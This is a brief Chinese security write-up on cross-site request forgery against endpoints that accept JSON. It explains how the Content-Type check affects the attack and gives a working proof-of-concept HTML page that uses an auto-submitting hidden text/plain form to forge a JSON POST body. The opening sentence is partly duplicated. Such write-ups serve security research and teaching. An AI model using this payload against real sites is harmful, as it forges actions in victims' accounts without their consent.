＃起因
前段时间，看到一个POST为JSON格式的CSRF，并且验证了Content-Type是否是application / json。构造后发前段时间，看到一个POST为JSON格式的CSRF，并且验证了Content-Type是否是application/json。构造后发现：

-使用form能构造出JSON的跨域请求，但是无法设置Content-Type。
-使用XMLHttpRequest或fetch能构造出JSON请求并能设置Content-Type，但是无法跨域。

#POC
存在两种场景：

-JSON CSRF（未验证Content-Type）
-JSON CSRF（验证Content-Type）(可以利用flash的跨域 + 307跳转来构造POC，但是src已经不收这种，所以这里就不提了)
##JSON CSRF（未验证Content-Type）
可以使用form进行跨域，并构造出JSON格式数据。

使用form的POC
```html
<html>
<title>JSON CSRF POC</title>

<form action="http://test.joychou.org" method="POST" enctype="text/plain" >
    <input name='{"name":"attacker","email":"attacker@gmail.com","ignore_me":"' value='test"}' type='hidden'>
</form>

<script>
      document.forms[0].submit();
</script>

</html>
```
构造出的POST数据为
```
{name: "attacker", email: "attacker@gmail.com", ignore_me: "=test"}
```
